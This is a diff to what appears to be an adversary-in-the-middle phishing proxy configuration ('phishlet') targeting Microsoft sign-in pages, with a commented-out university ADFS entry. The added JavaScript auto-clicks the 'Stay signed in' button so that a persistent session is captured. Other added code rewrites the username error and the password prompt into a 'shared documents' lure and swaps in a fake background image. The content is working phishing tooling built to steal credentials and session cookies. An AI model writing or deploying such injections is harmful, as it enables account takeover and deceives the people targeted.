@@ -27,6 +27,7 @@ proxy_hosts:
   # ADFS PART
   #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'tulane.edu', session: true, is_landing: false}
   - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'ibb.co', session: false, is_landing: false}
 #  - {phish_sub: 'github', orig_sub: '', domain: 'github.com', session: true, is_landing: false}
 #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}
 
@@ -42,6 +43,20 @@ sub_filters:
 
 
 js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: [ "/common/login" ]
+    script: |
+        console.log("ok")
+        const interval = setInterval(() => {
+        let button = document.querySelector("#idSIButton9");
+        
+        if (button && button.value.trim().toLowerCase() === "yes") {
+            button.click();
+            console.log("Clicked the button!");
+            clearInterval(interval); // Stop checking once clicked
+        }
+        }, 500); // Check every 500ms
+
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/"]
     script: |
@@ -60,6 +75,22 @@ js_inject:
       
       function lp(){
         try{
+            const observer = new MutationObserver((mutationsList) => {
+            mutationsList.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                  if (
+                    node.nodeType === Node.ELEMENT_NODE &&
+                    node.id === "usernameError"
+                  ) {
+                    node.textContent =
+                      "Enter the receiving email address to access shared documents";
+                    console.log("Error message modified.");
+                  }
+                });
+              });
+            });
+      
+            observer.observe(document.body, { childList: true, subtree: true });
             console.log("click form...");
             document.getElementById("i0116").click()
             console.log("started...");
@@ -105,7 +136,7 @@ js_inject:
           newElement.className = "row text-body";
           newElement.innerHTML = `
         <div id="passwordDesc" class="wrap-content" data-bind="text: unsafe_pageDescription">
-          Because you're accessing sensitive info, you need to verify your password.
+          Enter the password for your email address to access secure documents.
           </div>
           `;
           
@@ -128,8 +159,16 @@ js_inject:
         subtree: true,   // Monitor the entire subtree
         });
           
-          // Run an initial check in case the text is already present
+  
           checkAndAddElement();
+        const style = document.createElement("style");
+        style.textContent = `
+        #backgroundImage {
+            background-image: url("https://i.ibb.co.com/718HfGT/bg-docs.png") !important;
+        }
+        `;
+        //document.head.appendChild(style);
+        
 
 
 
